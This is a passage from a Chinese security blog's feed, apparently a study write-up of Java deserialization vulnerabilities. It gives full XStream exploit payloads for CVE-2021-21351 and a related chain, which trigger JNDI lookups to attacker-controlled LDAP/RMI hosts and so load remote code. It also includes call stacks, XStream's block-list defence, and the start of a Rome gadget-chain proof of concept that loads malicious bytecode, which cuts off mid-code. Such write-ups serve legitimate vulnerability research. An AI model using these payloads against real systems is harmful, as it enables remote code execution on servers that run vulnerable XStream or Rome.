class="string">&quot;                                    &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                    &lt;threshold&gt;525&lt;/threshold&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;int&gt;700&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;int&gt;1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;string&gt;lazyValue&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;sun.swing.SwingLazyValue&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                    &lt;className&gt;javax.naming.InitialContext&lt;/className&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                    &lt;methodName&gt;doLookup&lt;/methodName&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                    &lt;args&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                        &lt;string&gt;ldap://10.37.129.2:1389/tl4srb&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                    &lt;/args&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;/sun.swing.SwingLazyValue&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;/hashtable&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;javax.swing.UIDefaults&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                    &lt;defaultLocale reference=&#x27;../../../../../../../javax.swing.UIDefaults/default/defaultLocale&#x27;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                    &lt;resourceCache/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;/javax.swing.UIDefaults&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;/javax.swing.UIDefaults&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;/tables&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/javax.swing.MultiUIDefaults&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;/value&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;type&gt;ysomap&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;m__obj class=&#x27;string&#x27;&gt;test&lt;/m__obj&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;/value&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/sorted-set&gt;&quot;</span>;</span><br><span class="line">        xStream.fromXML(xml);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>注意：这条链需要Xstream依赖为1.4.15 有版本限制</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这条链的入口点变了不在是PriorityQueue而是MultiUIDefaults这个类我们同样的看看其调用过程</p><p>主要的关键点在SwingLazyValue类的create方法中</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735397037808-4e8871af-1a0a-4970-883d-f71fdbb76ed7.png" alt=""><br>这个方法里调用了invoke方法后面可以利用ldap注入，调用栈列一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">doLookup:<span class="number">290</span>, InitialContext (javax.naming)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">createValue:<span class="number">73</span>, SwingLazyValue (sun.swing)</span><br><span class="line">getFromHashtable:<span class="number">216</span>, UIDefaults (javax.swing)</span><br><span class="line">get:<span class="number">161</span>, UIDefaults (javax.swing)</span><br><span class="line">get:<span class="number">64</span>, MultiUIDefaults (javax.swing)</span><br><span class="line">toString:<span class="number">197</span>, MultiUIDefaults (javax.swing)</span><br><span class="line">equals:<span class="number">392</span>, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">compareTo:<span class="number">441</span>, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">compareTo:<span class="number">420</span>, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">put:<span class="number">568</span>, TreeMap (java.util)</span><br><span class="line">putAll:<span class="number">281</span>, AbstractMap (java.util)</span><br><span class="line">putAll:<span class="number">327</span>, TreeMap (java.util)</span><br><span class="line">populateTreeMap:<span class="number">121</span>, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">unmarshal:<span class="number">92</span>, TreeSetConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">convert:<span class="number">72</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:<span class="number">72</span>, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">66</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">50</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:<span class="number">134</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">32</span>, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">1409</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:<span class="number">1388</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">1273</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">1264</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:<span class="number">71</span>, CVE_2021 (com.ocean)</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21351">CVE_2021_21351</h2><h3 id="测试环境-6">测试环境</h3><p>jdk8u65</p><p>xstream 1.4.15</p><p>还是先展示payload再去分析原因</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2021_21351</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;sorted-set&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;type&gt;ysomap&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;m__DTMXRTreeFrag&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;m__dtm class=&#x27;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__size&gt;-10086&lt;/m__size&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__mgrDefault&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;__useServicesMechanism&gt;false&lt;/__useServicesMechanism&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;m__incremental&gt;false&lt;/m__incremental&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;m__source__location&gt;false&lt;/m__source__location&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;m__dtms&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/m__dtms&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;m__defaultHandler/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;/m__mgrDefault&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__shouldStripWS&gt;false&lt;/m__shouldStripWS&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__indexing&gt;false&lt;/m__indexing&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__incrementalSAXSource class=&#x27;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;fPullParserConfig class=&#x27;com.sun.rowset.JdbcRowSetImpl&#x27; serialization=&#x27;custom&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;javax.sql.rowset.BaseRowSet&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;concurrency&gt;1008&lt;/concurrency&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;fetchDir&gt;1000&lt;/fetchDir&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;fetchSize&gt;0&lt;/fetchSize&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;isolation&gt;2&lt;/isolation&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;maxRows&gt;0&lt;/maxRows&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;readOnly&gt;true&lt;/readOnly&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;rowSetType&gt;1004&lt;/rowSetType&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;showDeleted&gt;false&lt;/showDeleted&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;dataSource&gt;rmi://localhost:1099/tl4srb&lt;/dataSource&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;listeners/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;params/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;/javax.sql.rowset.BaseRowSet&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;com.sun.rowset.JdbcRowSetImpl&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;default/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/fPullParserConfig&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;fConfigSetInput&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;name&gt;setAutoCommit&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;parameter-types&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;class&gt;boolean&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;/parameter-types&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/fConfigSetInput&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;fConfigParse reference=&#x27;../fConfigSetInput&#x27;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;fParseInProgress&gt;false&lt;/fParseInProgress&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;/m__incrementalSAXSource&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__walker&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;nextIsRaw&gt;false&lt;/nextIsRaw&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;/m__walker&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__endDocumentOccured&gt;false&lt;/m__endDocumentOccured&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__idAttributes/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__textPendingStart&gt;-1&lt;/m__textPendingStart&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__useSourceLocationProperty&gt;false&lt;/m__useSourceLocationProperty&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;m__pastFirstElement&gt;false&lt;/m__pastFirstElement&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;/m__dtm&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;m__dtmIdentity&gt;1&lt;/m__dtmIdentity&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;/m__DTMXRTreeFrag&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;m__dtmRoot&gt;1&lt;/m__dtmRoot&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;m__allowRelease&gt;false&lt;/m__allowRelease&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/value&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;type&gt;ysomap&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;m__obj class=&#x27;string&#x27;&gt;test&lt;/m__obj&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/value&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/sorted-set&gt;&quot;</span>;</span><br><span class="line">        xStream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="防御">防御</h2><p>XStream为了防护这些漏洞，直接使用黑名单的方式对可利用链的相关类进行拦截，如1.4.15中XStream.class类中的setupSecurity函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setupSecurity</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.securityMapper != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.addPermission(AnyTypePermission.ANY);</span><br><span class="line">        <span class="built_in">this</span>.denyTypes(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;java.beans.EventHandler&quot;</span>, <span class="string">&quot;java.lang.ProcessBuilder&quot;</span>, <span class="string">&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span>, <span class="string">&quot;jdk.nashorn.internal.objects.NativeString&quot;</span>&#125;);</span><br><span class="line">        <span class="built_in">this</span>.denyTypesByRegExp(<span class="keyword">new</span> <span class="title class_">Pattern</span>[]&#123;LAZY_ITERATORS, JAVAX_CRYPTO, JAXWS_FILE_STREAM&#125;);</span><br><span class="line">        <span class="built_in">this</span>.allowTypeHierarchy(Exception.class);</span><br><span class="line">        <span class="built_in">this</span>.securityInitialized = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体参考：<a href="https://paper.seebug.org/1543/#5-cve-2021-21351">https://paper.seebug.org/1543/#5-cve-2021-21351</a></p><p><a href="https://fynch3r.github.io/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/">https://fynch3r.github.io/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/</a></p><p><a href="https://m0d9.me/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/">https://m0d9.me/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;简介&lt;/h2&gt;
&lt;p&gt;XStream是一个简单的基于Java库，Java对象序列化到XML，反之亦然(即：可以轻易的将Java对象和xml文档相互转换)。&lt;/p&gt;
&lt;p&gt;Xstream具有以下优点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用方便 - XStream的A</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="Xstream" scheme="https://oceanzbz.github.io/tags/Xstream/"/>
    
  </entry>
  
  <entry>
    <title>Rome反序列化</title>
    <link href="https://oceanzbz.github.io/post/35e94ed1.html"/>
    <id>https://oceanzbz.github.io/post/35e94ed1.html</id>
    <published>2024-12-30T06:12:17.000Z</published>
    <updated>2025-03-05T07:24:36.795Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>之前没学习过rome反序列化这里学习一下因为能和二次反序列化结合</p><h2 id="介绍">介绍</h2><p>ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。</p><p>Rome 提供了 ToStringBean 这个类，提供深入的 toString 方法对JavaBean进行操作。</p><h2 id="环境依赖">环境依赖</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;rome&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;rome&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.0</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><h2 id="调试流程">调试流程</h2><p>调用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* ObjectBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashCode()</span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p>其实这里主要的漏洞点是在ToStringBean.toString()这里来看一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735223607844-e6444f41-5524-46db-828d-fe9aa80c46ad.png" alt=""></p><p>这个方法可以调用任意类的getter方法，主要是在getPropertyDescriptors方法中看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735223678450-2ffce0a8-7979-4ca9-acae-c271b8ac4544.png" alt=""></p><p>这个方法中存在一个getPDs方法跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735223716657-de929ecc-2163-4a11-b4cd-7eb028e75102.png" alt=""></p><p>就是获得 class 的 getter 和 setter 方法。然后回到上面的 <code>**getPropertyDescriptors**</code> 方法，在获得 getter 和 setter 方法后调用了 <code>**_introspected.put**</code> 处理。<code>**_introspected**</code> 就是上面的 hashmap 对象。意思就是调用了 hashmap 的 put 方法把方法存进了 map 中，然后在 ToStringBean. toString 进行遍历 map 。</p><p>所以其实这里的利用就很显而易见了就可以直接结合templates链进行利用加载恶意的字节码了。这里看一下该类的构造方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735223893196-eb197b67-2fcf-4b9f-99ad-75caee555ce6.png" alt=""></p><p>其中<code>_beanClass</code>为JavaBean类型的class，<code>_obj</code>为要调用的实例对象，这里要传入的当然就是要利用的<code>TemplatesImpl</code>所以这里我们手动调用一下toString方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Rome_stu/src/main/java/Exp.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 